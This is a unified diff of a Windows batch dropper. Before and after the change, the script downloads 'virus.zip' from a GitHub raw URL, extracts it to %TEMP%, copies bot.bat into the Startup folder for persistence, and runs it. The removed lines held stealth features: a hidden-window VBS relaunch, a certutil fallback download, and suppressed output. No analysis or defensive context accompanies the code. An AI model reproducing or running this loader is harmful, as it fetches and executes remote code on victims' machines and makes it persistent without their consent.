@@ -1,37 +1,24 @@
 @echo off
-if not "%1"=="H" (
-    echo Set WshShell = CreateObject("WScript.Shell"^) > "%temp%\hide.vbs"
-    echo WshShell.Run """" ^& WScript.ScriptFullName ^& """ H", 0, False >> "%temp%\hide.vbs"
-    wscript.exe "%temp%\hide.vbs"
-    exit /b
-)
-
 setlocal enabledelayedexpansion
 
 set "tempdir=%TEMP%"
 set "zipurl=https://raw.githubusercontent.com/banzoxOG/zip/main/virus.zip"
 set "zipfile=%tempdir%\virus.zip"
 
-:: Force TLS 1.2, download with PowerShell; fallback certutil
-powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; try { Invoke-WebRequest -Uri '%zipurl%' -OutFile '%zipfile%' } catch { exit 1 }" >nul 2>&1
-if %errorlevel% neq 0 (
-    certutil -urlcache -f "%zipurl%" "%zipfile%" >nul 2>&1
-)
+:: Download the zip from raw GitHub
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%zipurl%' -OutFile '%zipfile%';"
 
-:: Give it a moment
-ping -n 2 127.0.0.1 >nul
+:: Extract all files directly into %TEMP%, overwrite if exist
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Expand-Archive -Path '%zipfile%' -DestinationPath '%tempdir%' -Force;"
 
-:: Extract all files directly into %TEMP%, overwrite
-powershell -NoProfile -ExecutionPolicy Bypass -Command "Expand-Archive -Path '%zipfile%' -DestinationPath '%tempdir%' -Force;" >nul 2>&1
+:: Delete the zip file (optional, uncomment if you want it gone)
+:: del /f /q "%zipfile%"
 
-:: Copy bot.bat to shell:startup and run it silently
+:: Copy bot.bat to shell:startup and run it
 set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 if exist "%tempdir%\bot.bat" (
-    copy /y "%tempdir%\bot.bat" "%startup%\bot.bat" >nul 2>&1
-    start "" /B "%tempdir%\bot.bat"
+    copy /y "%tempdir%\bot.bat" "%startup%\bot.bat"
+    start "" "%tempdir%\bot.bat"
 )
-
-:: Cleanup helper
-del /f /q "%temp%\hide.vbs" >nul 2>&1
 
 exit
